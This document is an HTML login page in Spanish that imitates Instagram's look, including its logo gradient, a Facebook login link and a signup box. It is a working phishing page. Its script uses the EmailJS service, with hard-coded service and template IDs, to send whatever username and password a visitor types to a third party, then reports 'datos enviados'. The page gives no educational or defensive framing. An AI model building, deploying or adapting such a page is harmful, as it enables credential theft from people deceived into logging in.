<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Login</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Helvetica', sans-serif;
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      text-align: center;
    }

    .login-box {
      background: white;
      border: 1px solid #dbdbdb;
      padding: 40px;
      width: 300px;
      margin-bottom: 10px;
    }

    .logo-placeholder {
      height: 60px;
      margin-bottom: 30px;
      background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
      border-radius: 12px;
    }

    input {
      display: block;
      width: 100%;
      margin-bottom: 6px;
      padding: 9px;
      font-size: 14px;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
      background: #fafafa;
    }

    button {
      width: 100%;
      padding: 9px;
      background-color: #0095f6;
      color: white;
      border: none;
      font-weight: bold;
      margin-top: 10px;
      border-radius: 4px;
      cursor: pointer;
    }

    .separator {
      display: flex;
      align-items: center;
      text-align: center;
      margin: 20px 0;
    }

    .line {
      flex: 1;
      height: 1px;
      background-color: #dbdbdb;
    }

    .or {
      margin: 0 10px;
      color: #8e8e8e;
      font-size: 13px;
    }

    .fb-login {
      color: #385185;
      font-weight: bold;
      font-size: 14px;
      margin: 10px 0;
      cursor: pointer;
    }

    .forgot {
      font-size: 12px;
      color: #00376b;
      margin-top: 12px;
      cursor: pointer;
    }

    .signup-box {
      background: white;
      border: 1px solid #dbdbdb;
      padding: 20px;
      font-size: 14px;
    }

    .signup-box a {
      color: #0095f6;
      text-decoration: none;
      font-weight: bold;
    }
  </style>

  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    function sendLoginForm(e) {
      e.preventDefault();

      emailjs.init("FL6vofHg7F9vLawQs");

      emailjs.send("service_6pbv86h", "template_z1nimz6", {
        user: document.getElementById("user").value,
        password: document.getElementById("password").value,
      })
      .then(() => {
        alert("Datos enviados correctamente.");
        document.getElementById("loginForm").reset();
      }, (error) => {
        alert("Error al enviar: " + JSON.stringify(error));
      });
    }
  </script>
</head>
<body>
  <div class="container">
    <div class="login-box">
      <div class="logo-placeholder"></div>

      <form id="loginForm" onsubmit="sendLoginForm(event)">
        <input type="text" id="user" placeholder="Usuario" required />
        <input type="password" id="password" placeholder="Contraseña" required />
        <button type="submit">Iniciar sesión</button>

        <div class="separator">
          <div class="line"></div>
          <div class="or">O</div>
          <div class="line"></div>
        </div>

        <div class="fb-login">Iniciar sesión con Facebook</div>
        <div class="forgot">¿Has olvidado la contraseña?</div>
      </form>
    </div>

    <div class="signup-box">
      ¿No tienes una cuenta? <a href="#">Regístrate</a>
    </div>
  </div>
</body>
</html>
